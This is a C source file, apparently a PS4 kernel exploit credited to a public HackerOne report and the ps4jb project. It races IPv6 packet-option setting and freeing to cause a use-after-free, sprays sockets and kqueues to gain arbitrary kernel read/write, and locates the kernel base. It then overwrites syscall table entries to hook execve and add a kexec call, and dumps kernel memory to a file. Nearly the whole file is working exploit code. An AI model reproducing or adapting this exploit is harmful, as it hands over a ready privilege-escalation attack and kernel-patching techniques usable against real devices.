// From theflow & sleirsgoevy
// https://hackerone.com/reports/826026
// https://github.com/sleirsgoevy/ps4jb/blob/master/src/kex.c

#include "define.h"

#pragma comment(lib, "ScePosix_stub_weak")

#define	IPPROTO_IPV6		41
#define IPV6_TCLASS		61

#define IPV6_RTHDR_TYPE_0    0
#define IPV6_RTHDR		51
#define IPV6_PKTINFO		46

#define ELF_MAGIC 0x464c457f

#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25

#define TCLASS_MASTER 0x13370000
#define TCLASS_MASTER_2 0x13380000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42

#define NUM_SPRAY_RACE 32
#define NUM_SPRAY 64
#define NUM_KQUEUES 64

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

#define PROC_LIST_OFFSET (offsetof(struct proc, p_list))
#define PROC_UCRED_OFFSET (offsetof(struct proc, p_ucred))
#define PROC_FD_OFFSET (offsetof(struct proc, p_fd))
#define PROC_PID_OFFSET (offsetof(struct proc, p_pid))

#define FILEDESC_OFILES_OFFSET (offsetof(struct filedesc, fd_ofiles))
#define FILEDESC_NFILES_OFFSET (offsetof(struct filedesc, fd_nfiles))
#define FILE_TYPE_OFFSET (offsetof(struct file, f_type))
#define FILE_DATA_OFFSET (offsetof(struct file, f_data))

#define KNOTE_FOP_OFFSET (offsetof(struct knote, kn_fop))
#define FILTEROPS_DETACH_OFFSET (offsetof(struct filterops, f_detach))

#define SOCKET_PCB_OFFSET (offsetof(struct socket, so_pcb))
#define INPCB_OUTPUTOPTS_OFFSET (offsetof(struct inpcb, in6p_outputopts))

int close(int fd);
int setuid(uid_t uid);

static uint64_t kernel_base;
static uint64_t kevent_addr, pktopts_addr;

static int triggered = 0;
static int kevent_sock, master_sock, overlap_sock, victim_sock;
static int spray_sock[NUM_SPRAY];
static int kq[NUM_KQUEUES];

static int overlap_sock1 = -1;
static int overlap_sock2 = -1;
static int overlap_sock3 = -1;

#define printlog(format) { printf("%lu | ", sceKernelGetProcessTime()); printf(format); }
#define printlog_args(format, ...) { printf("%lu | ", sceKernelGetProcessTime()); printf(format, __VA_ARGS__); }

static void hexDump(const void *data, size_t size) {
	size_t i;
	for (i = 0; i < size; i++) {
		printlog_args("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '\n');
	}
	printlog("\n");
}

static void do_crash()
{
	uint32_t* p = (uint32_t*)0x0;
	*p = 0;
}

static int new_socket(void) {
	int result = socket(AF_INET6, SOCK_DGRAM, 0);

	if (result == -1)
		printlog("new_socket failed\n");

	return result;
}

static int close_socket(int s)
{
	int result = close(s);

	if (result != 0)
	{
		printlog_args("close_socket %x failed, code = %d\n", s, result);
	}
	else
	{
		printlog_args("close_socket %x ok\n", s);
	}

	return result;
}

static void build_tclass_cmsg(char *buf, int val) {
	struct cmsghdr *cmsg;

	cmsg = (struct cmsghdr *)buf;
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = IPPROTO_IPV6;
	cmsg->cmsg_type = IPV6_TCLASS;

	*(int *)CMSG_DATA(cmsg) = val;
}

static int build_rthdr_msg(char *buf, int size) {
	struct ip6_rthdr *rthdr;
	int len;

	len = ((size >> 3) - 1) & ~1;
	size = (len + 1) << 3;

	memset(buf, 0, size);

	rthdr = (struct ip6_rthdr *)buf;
	rthdr->ip6r_nxt = 0;
	rthdr->ip6r_len = len;
	rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
	rthdr->ip6r_segleft = rthdr->ip6r_len >> 1;

	return size;
}

static int get_rthdr(int s, char *buf, socklen_t len) {
	int result = getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &len);
	if (result != 0)
		printlog("get_rthdr failed!\n");

	return result;
}

static int set_rthdr(int s, char *buf, socklen_t len) {
	int result = setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
	if (result != 0)
		printlog("set_rthdr failed!\n");

	return result;
}

static int free_rthdr(int s) {
	return set_rthdr(s, NULL, 0);
}

static int get_tclass(int s) {
	int val;
	socklen_t len = sizeof(val);

	int result = getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, &len);
	if (result != 0)
		printlog("get_tclass failed!\n");

	return val;
}

static int set_tclass(int s, int val) {
	int result = setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val));
	if (result != 0)
		printlog("set_tclass failed!\n");

	return result;
}

static int get_pktinfo(int s, char *buf) {
	socklen_t len = sizeof(struct in6_pktinfo);

	int result = getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &len);
	if (result != 0)
		printlog("get_pktinfo failed!\n");

	return result;
}

static int set_pktinfo(int s, char *buf) {
	int result = setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo));
	if (result != 0)
		printlog_args("set_pktinfo failed!, s = %x, buf = %lx, errno = %d\n", s, (uint64_t)buf, errno);

	return result;
}

static int set_pktopts(int s, char *buf, socklen_t len) {
	int result = setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len);
	if (result != 0)
		printlog("set_pktopts failed!\n");

	return result;
}

static int free_pktopts(int s) {
	int result = set_pktopts(s, NULL, 0);
	if (result != 0)
		printlog("free_pktopts failed!\n");

	return result;
}

static uint64_t leak_rthdr_ptr(int s) {
	char buf[0x100];
	get_rthdr(s, buf, sizeof(buf));
	return *(uint64_t *)(buf + PKTOPTS_RTHDR_OFFSET);
}

static uint64_t leak_kmalloc(char *buf, int size) {
	int rthdr_len = build_rthdr_msg(buf, size);
	set_rthdr(master_sock, buf, rthdr_len);
#ifdef FBSD12
	get_rthdr(master_sock, buf, rthdr_len);
	return *(uint64_t *)(buf + 0x00);
#else
	return leak_rthdr_ptr(overlap_sock);
#endif
}

static void write_to_victim(uint64_t addr) {
	char buf[sizeof(struct in6_pktinfo)];
	*(uint64_t *)(buf + 0x00) = addr;
	*(uint64_t *)(buf + 0x08) = 0;
	*(uint32_t *)(buf + 0x10) = 0;
	set_pktinfo(master_sock, buf);
}

static uint8_t kread8(uint64_t addr) {
	char buf[sizeof(struct in6_pktinfo)];
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	return *(uint8_t *)buf;
}

static uint16_t kread16(uint64_t addr) {
	char buf[sizeof(struct in6_pktinfo)];
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	return *(uint16_t *)buf;
}

static uint32_t kread32(uint64_t addr) {
	char buf[sizeof(struct in6_pktinfo)];
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	return *(uint32_t *)buf;
}

static uint64_t kread64(uint64_t addr) {
	char buf[sizeof(struct in6_pktinfo)];
	write_to_victim(addr);
	get_pktinfo(victim_sock, buf);
	return *(uint64_t *)buf;
}

static void kread(void *dst, uint64_t src, size_t len) {
	for (int i = 0; i < len; i++)
		((uint8_t *)dst)[i] = kread8(src + i);
}

// this is bugged, avoid use if possible
static int kwrite(uint64_t addr, void *buf, size_t buflen) {
	static const size_t chunkSize = 16;

	char tmpBuf[sizeof(struct in6_pktinfo)];
	memset(tmpBuf, 0, sizeof(struct in6_pktinfo));

	size_t left = buflen;
	size_t cur_offset = 0;

	uint64_t cur_addr = addr;

	while (left > 0)
	{
		size_t size = left > chunkSize ? chunkSize : left;

		//printlog_args("kwrite cur_addr = %lx, cur_offset = %ld, size = %ld, left = %ld\n", cur_addr, cur_offset, size, left);

		write_to_victim(cur_addr);
		get_pktinfo(victim_sock, tmpBuf);

		memcpy(tmpBuf, (char*)buf + cur_offset, size);
		*(uint32_t*)(tmpBuf + 16) = 0;

		/*printlog("	tmpbuf = \n");

		{
			for (size_t i = 0; i < chunkSize; i++)
			{
				int32_t v = tmpBuf[i];
				printlog_args("		[%lu] = %02x\n", cur_offset + i, v);
			}
		}*/

		int skip = 1;
		for (int i = 0; i < 20; i++)
		{
			if (tmpBuf[i] != 0)
			{
				skip = 0;
				break;
			}
		}

		if (skip == 0)
		{
			write_to_victim(cur_addr);
			set_pktinfo(victim_sock, tmpBuf);
		}
		else
		{
			//printlog("		skip\n");
		}

		cur_offset += size;
		cur_addr += size;
		left -= size;
	}

	return 0;
}

static uint64_t find_kernel_base(uint64_t addr) {
	addr &= ~(PAGE_SIZE - 1);
	while (kread32(addr) != ELF_MAGIC)
		addr -= PAGE_SIZE;
	return addr;
}

static void wait(uint64_t us)
{
	uint64_t startTimeUs = sceKernelGetProcessTime();

	while (1)
	{
		uint64_t timePassed = (sceKernelGetProcessTime() - startTimeUs);

		if (timePassed >= us)
			break;
	}
}

static void test_sock(int s, uint64_t addr)
{
	victim_sock = s;

	printlog_args("	test sock %x read at %lx\n", victim_sock, addr);

	uint64_t value = kread64(addr);
	printlog_args("		result = %lx\n", value);
}

static void test_sock_write(int s, uint64_t addr)
{
	victim_sock = s;

	printlog_args("	test sock %x write at %lx\n", victim_sock, addr);

	unsigned char buf[] = { 0x68, 0x69, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75};
	kwrite(addr, buf, 8);

	uint64_t value = kread64(addr);
	printlog_args("		result = %lx\n", value);
}

static int find_victim_sock(void) {
	char buf[sizeof(struct in6_pktinfo)];

	uint64_t test_addr = (kevent_addr + kevent_sock * sizeof(uintptr_t));
	printlog_args("find_victim_sock test_addr = %lx\n", test_addr);

	int found_idx = -1;

	for (int i = 0; i < NUM_SPRAY; i++) {
		write_to_victim(test_addr);
		get_pktinfo(spray_sock[i], buf);

		uint64_t v = *(uint64_t *)(buf + 0x00);

		if (v != 0 && v != test_addr)
		{
			printlog_args("find_victim_sock found at idx %x (%x), %lx\n", i, spray_sock[i], v);

			test_sock(spray_sock[i], (kevent_addr + kevent_sock * sizeof(uintptr_t)));
			//test_sock_write(spray_sock[i], (kevent_addr + kevent_sock * sizeof(uintptr_t)) + 64);
			test_sock(spray_sock[i], (kevent_addr + kevent_sock * sizeof(uintptr_t)) + 64);

			if (v != 0 && v != test_addr)
				found_idx = i;
		}
	}

	return found_idx;
}

static int find_overlap_sock(void) {
	set_tclass(master_sock, TCLASS_TAINT);

	int found_idx = -1;

	for (int i = 0; i < NUM_SPRAY; i++) {
		if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
		{
			printlog_args("find_overlap_sock found at %x\n", i);

			if (found_idx < 0)
				found_idx = i;
		}
	}

	return found_idx;
}

static int spray_pktopts(void) {
	for (int i = 0; i < NUM_SPRAY_RACE; i++)
		set_tclass(spray_sock[i], TCLASS_SPRAY);

	if (get_tclass(master_sock) == TCLASS_SPRAY)
		return 1;

	for (int i = 0; i < NUM_SPRAY_RACE; i++)
		free_pktopts(spray_sock[i]);

	return 0;
}

static void *use_thread(void *arg) {
	printlog_args("use_thread cpuid = %d\n", sceKernelGetCurrentCpu());

	char buf[CMSG_SPACE(sizeof(int))];
	build_tclass_cmsg(buf, 0);

	while (!triggered && get_tclass(master_sock) != TCLASS_SPRAY) {
		set_pktopts(master_sock, buf, sizeof(buf));
	}

	triggered = 1;
	return NULL;
}

static void *free_thread(void *arg) {
	printlog_args("free_thread cpuid = %d\n", sceKernelGetCurrentCpu());

	while (!triggered && get_tclass(master_sock) != TCLASS_SPRAY) {
		free_pktopts(master_sock);

		{
			struct timespec spec;
			spec.tv_sec = 0;
			spec.tv_nsec = 100;

			nanosleep(&spec, NULL);
		}
	}

	triggered = 1;
	return NULL;
}

static int trigger_uaf(void) {
	pthread_t th[2];

	pthread_create(&th[0], NULL, use_thread, NULL);
	pthread_create(&th[1], NULL, free_thread, NULL);

	printlog_args("main_thread cpuid = %d\n", sceKernelGetCurrentCpu());

	while (1) {
		if (spray_pktopts())
			break;

		{
			struct timespec spec;
			spec.tv_sec = 0;
			spec.tv_nsec = 100;

			nanosleep(&spec, NULL);
		}
	}

	triggered = 1;

	pthread_join(th[0], NULL);
	pthread_join(th[1], NULL);

	return find_overlap_sock();
}

int fake_pktopts(int tclass0, unsigned long long pktinfo)
{
	free_pktopts(overlap_sock);
	char buf[0x100] = { 0 };
	int l = build_rthdr_msg(buf, 0x100);
	int tclass;
	for (;;)
	{
		printlog("fake_pktopts loop\n");

		for (int i = 0; i < NUM_SPRAY; i++)
		{
			*(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
			*(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
			if (set_rthdr(spray_sock[i], buf, l))
				printlog("	fake_pktopts failed 1\n");
		}
		tclass = get_tclass(master_sock);
		if ((tclass & 0xffff0000) == tclass0)
			break;
		for (int i = 0; i < NUM_SPRAY; i++)
			if (set_rthdr(spray_sock[i], NULL, 0))
				printlog("	fake_pktopts failed 2\n");
	}
	return tclass & 0xffff;
}

static void leak_kevent_pktopts(void) {
	char buf[0x800];

	struct kevent kv;
	EV_SET(&kv, kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);

	// Leak 0x800 kmalloc addr
	kevent_addr = leak_kmalloc(buf, 0x800);
	printlog_args("[+] kevent_addr: 0x%lx\n", kevent_addr);

	// Free rthdr buffer and spray kevents to occupy this location
	free_rthdr(master_sock);
	for (int i = 0; i < NUM_KQUEUES; i++)
		kevent(kq[i], &kv, 1, 0, 0, 0);

	// Free pktopts
	for (int i = 0; i < NUM_SPRAY; i++)
		free_pktopts(spray_sock[i]);

	// Leak 0x100 kmalloc addr
	pktopts_addr = leak_kmalloc(buf, 0x100);
	printlog_args("[+] pktopts_addr: 0x%lx\n", pktopts_addr);

	// Free rthdr buffer and spray pktopts to occupy this location
	free_rthdr(master_sock);
	for (int i = 0; i < NUM_SPRAY; i++)
		set_tclass(spray_sock[i], 0);
}

struct sysent
{
	int sy_narg;
	uint8_t dummy1[4];
	void* sy_call;
	uint8_t dummy2[20];
	u_int32_t sy_return;
	u_int32_t sy_flags;
	u_int32_t sy_thrcnt;
};

static void* search_syscall(unsigned char b[8])
{
	unsigned char* searchBeginAddr = (unsigned char*)0x800000000;
	size_t maxSearchSize = 100 * 1024;

	unsigned char* curPtr = searchBeginAddr;
	while (1)
	{
		if (curPtr[0] == b[0] &&
			curPtr[1] == b[1] &&
			curPtr[2] == b[2] &&
			curPtr[3] == b[3] &&
			curPtr[4] == b[4] &&
			curPtr[5] == b[5] &&
			curPtr[6] == b[6] &&
			curPtr[7] == b[7])
			return curPtr;

		curPtr += 8;

		if (curPtr >= (unsigned char*)(searchBeginAddr + maxSearchSize))
			break;
	}

	return 0x0;
}

typedef int(*execve_fn)(const char *path, char *const argv[], char *const envp[]);
execve_fn sys_execve = 0;

typedef int(*kexec_fn)();
typedef int(*execve_hook_fn)(kexec_fn func, void* context, void* dummy);

void search_syscalls()
{
	{
		unsigned char b[8] = { 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x49 };
		sys_execve = (execve_fn)search_syscall(b);
	}
}

struct kexec_patch_params_s
{
	uint64_t in_sysent_execve_addr; // execve sysent address
	uint64_t in_sysent_umask_addr; // umask sysent address

	struct sysent in_sysent_execve_original; // original sysent to be restored
	struct sysent in_sysent_umask_original; // original sysent to be restored

	uint64_t in_sysent_kexec_addr; // kexec sysent address
	struct sysent in_sysent_kexec_new; // new sysent to be patch

	// dump kernel
	size_t in_kernel_dump_size;
	void* inOut_kernel_dump_data;
};

struct kexec_patch_params_s kexec_patch_params;

// actual patching & cleanup
static int kexec_patch()
{
	struct kexec_patch_params_s* params = &kexec_patch_params;

	uint64_t rax = 0, rbx = 0, rdi = 0, rsi = 0;
	__asm__("" : "=a"(rax), "=b"(rbx), "=D"(rdi), "=S"(rsi) ::);

	struct thread* td = (struct thread*)rdi;

	td->td_proc->p_fd->fd_ofiles[master_sock] = 0;
	td->td_proc->p_fd->fd_ofiles[overlap_sock] = 0;
	td->td_proc->p_fd->fd_ofiles[victim_sock] = 0;

	/*td->td_proc->p_fd->fd_ofiles[kevent_sock] = 0;
	td->td_proc->p_fd->fd_ofiles[overlap_sock1] = 0;
	td->td_proc->p_fd->fd_ofiles[overlap_sock2] = 0;
	td->td_proc->p_fd->fd_ofiles[overlap_sock3] = 0;

	for (int i = 0; i < NUM_SPRAY; i++)
		td->td_proc->p_fd->fd_ofiles[spray_sock[i]] = 0;*/

	*((struct sysent*)params->in_sysent_execve_addr) = params->in_sysent_execve_original;
	*((struct sysent*)params->in_sysent_umask_addr) = params->in_sysent_umask_original;

	*((struct sysent*)params->in_sysent_kexec_addr) = params->in_sysent_kexec_new;

	if (params->inOut_kernel_dump_data && params->in_kernel_dump_size > 0)
	{
		unsigned char* src = (unsigned char*)kernel_base;
		unsigned char* dest = (unsigned char*)params->inOut_kernel_dump_data;

		for (size_t i = 0; i < params->in_kernel_dump_size; i++)
			dest[i] = src[i];
	}

	return 0;
}

size_t sceLibcHeapSize = 256 * 1024 * 1024;

void* kexploit(void* context)
{
	wait(2500000);

	/*if (!setuid(0))
	{
		printlog("!setuid(0)\n");
		return NULL;
	}*/

	search_syscalls();

	printlog_args("sys_execve = 0x%lx\n", (uint64_t)sys_execve);

	{
		char* argv[] = { "" };
		char* envp[] = { "" };
		printlog_args("sys_execve test result = %d, errno = %d\n", sys_execve("/app0/dummytest", argv, envp), errno);
	}

	{
		uint64_t rax = 0, rbx = 0, rdi = 0, rsi = 0;
		__asm__("" : "=a"(rax), "=b"(rbx), "=D"(rdi), "=S"(rsi) ::);

		printlog_args("rax = 0x%lx, rbx = 0x%lx, rdi = 0x%lx, rsi = 0x%lx\n", rax, rbx, rdi, rsi);
	}

	uint64_t knote, kn_fop, f_detach;
	int idx;

	printlog("[*] Initializing sockets...\n");

	kevent_sock = new_socket();
	master_sock = new_socket();

	for (int i = 0; i < NUM_SPRAY; i++)
		spray_sock[i] = new_socket();

	for (int i = 0; i < NUM_KQUEUES; i++)
		kq[i] = kqueue();

	printlog("[*] Triggering UAF...\n");
	idx = trigger_uaf();
	if (idx == -1) {
		printlog("[-] Error could not find overlap sock.\n");
		do_crash();
	}

	// master_sock and overlap_sock point to the same pktopts
	overlap_sock = spray_sock[idx];
	overlap_sock1 = overlap_sock;
	spray_sock[idx] = new_socket();
	printlog_args("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

	// Reallocate pktopts
	for (int i = 0; i < NUM_SPRAY; i++) {
		free_pktopts(spray_sock[i]);
		set_tclass(spray_sock[i], 0);
	}

	// Fake master pktopts
	idx = fake_pktopts(TCLASS_MASTER, 0);
	overlap_sock = spray_sock[idx];
	overlap_sock2 = overlap_sock;
	spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier
	printlog_args("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

	// Leak address of some kevent and pktopts
	leak_kevent_pktopts();

	// Fake master pktopts
	idx = fake_pktopts(TCLASS_MASTER_2, pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
	overlap_sock = spray_sock[idx];
	overlap_sock3 = overlap_sock;
	printlog_args("[+] Overlap socket: %x (%x)\n", overlap_sock, idx);

	idx = find_victim_sock();
	if (idx == -1) {
		printlog("[-] Error could not find victim sock.\n");
		do_crash();
	}

	victim_sock = spray_sock[idx];
	printlog_args("[+] Victim socket: %x (%x)\n", victim_sock, idx);

	printlog("[+] Arbitrary R/W achieved.\n");

	knote = kread64(kevent_addr + kevent_sock * sizeof(uintptr_t));
	kn_fop = kread64(knote + KNOTE_FOP_OFFSET);
	f_detach = kread64(kn_fop + FILTEROPS_DETACH_OFFSET);

	printlog_args("[+] knote: 0x%lx\n", knote);
	printlog_args("[+] kn_fop: 0x%lx\n", kn_fop);
	printlog_args("[+] f_detach: 0x%lx\n", f_detach);

	printlog("[+] Finding kernel base...\n");
	kernel_base = find_kernel_base(f_detach);
	printlog_args("[+] Kernel base: 0x%lx\n", kernel_base);

	size_t kernel_dump_size = 32 * 1024 * 1024;
	void* kernel_dump_data = NULL;

	if (kernel_dump_size > 0)
	{
		kernel_dump_data = malloc(kernel_dump_size);

		if (!kernel_dump_data)
		{
			printlog_args("alloc kernel_dump_data %lu failed\n", kernel_dump_size);
			do_crash();
		}
	}

	uint64_t offset_jmp_qword_ptr_psi = 0x3520dc; // jmp qword ptr [rsi]

	uint64_t offset_sysent_execve = 0x120ab10;
	uint64_t offset_sysent_umask = offset_sysent_execve + sizeof(struct sysent);

	uint64_t offset_sysent_kexec = 0x120a210;

	{
		uint64_t jump_qword_ptr_rsi_addr = kernel_base + offset_jmp_qword_ptr_psi;

		uint64_t sysent_execve_addr = kernel_base + offset_sysent_execve;
		uint64_t sysent_umask_addr = kernel_base + offset_sysent_umask;

		uint64_t sysent_kexec_addr = kernel_base + offset_sysent_kexec;

		printlog("patch sys_execve...\n");

		struct sysent sysent_execve_original;
		struct sysent sysent_umask_original;

		kread(&sysent_execve_original, sysent_execve_addr, sizeof(sysent_execve_original));
		kread(&sysent_umask_original, sysent_umask_addr, sizeof(sysent_umask_original));

		{
			struct sysent ent;
			memset(&ent, 0x0, sizeof(ent));

			ent.sy_narg = 3;
			ent.sy_call = (void*)jump_qword_ptr_rsi_addr;

			ent.sy_return = 0;
			ent.sy_flags = 0;
			ent.sy_thrcnt = 1;

			kwrite(sysent_execve_addr, &ent, sizeof(ent));
		}

		{
			printlog("kexec_patch...\n");
			execve_hook_fn sys_execve_hook = (execve_hook_fn)sys_execve;

			{
				struct kexec_patch_params_s* params = &kexec_patch_params;

				params->in_sysent_execve_addr = sysent_execve_addr;
				params->in_sysent_umask_addr = sysent_umask_addr;

				params->in_sysent_execve_original = sysent_execve_original;
				params->in_sysent_umask_original = sysent_umask_original;

				{
					params->in_sysent_kexec_addr = sysent_kexec_addr;

					{
						struct sysent* ent = &params->in_sysent_kexec_new;
						memset(ent, 0x0, sizeof(*ent));

						ent->sy_narg = 2;
						ent->sy_call = (void*)jump_qword_ptr_rsi_addr;

						ent->sy_return = 0;
						ent->sy_flags = 0;
						ent->sy_thrcnt = 1;
					}
				}

				params->in_kernel_dump_size = kernel_dump_size;
				params->inOut_kernel_dump_data = kernel_dump_data;

				int result = sys_execve_hook(kexec_patch, NULL, NULL);
				printlog_args("kexec_patch result = %d\n", result);
			}
		}
	}

	// kread / kwrite no longer work after this, do not use it

	{
		char* argv[] = { "" };
		char* envp[] = { "" };
		printlog_args("sys_execve test result = %d, errno = %d\n", sys_execve("/app0/dummytest", argv, envp), errno);
	}

	if (kernel_dump_size > 0)
	{
		printlog("dumping kernel...\n");

		{
			const char* fName = "/data/kernel_505.bin";

			FILE* f = fopen(fName, "wb");

			if (f)
			{
				fwrite(kernel_dump_data, 1, kernel_dump_size, f);
				fclose(f);
			}
			else
			{
				printlog_args("dump kernel failed at fName %s\n", fName);
			}
		}

		free(kernel_dump_data);
		kernel_dump_size = 0;
		kernel_dump_data = NULL;

		printlog("dump finished\n");
	}

	/*printlog("[+] Cleanup...\n");

	{
		for (int i = 0; i < NUM_KQUEUES; i++)
		{
			if (close(kq[i]) != 0)
				printlog_args("close kq %d failed\n", i);
		}

		new_socket();
	}*/

	printlog("[+] Done.\n");

	wait(2500000);
	return NULL;
}

int main(int argc, char *argv[]) {
	pthread_t th;

	pthread_create(&th, NULL, kexploit, NULL);
	pthread_join(th, NULL);

	return 0;
}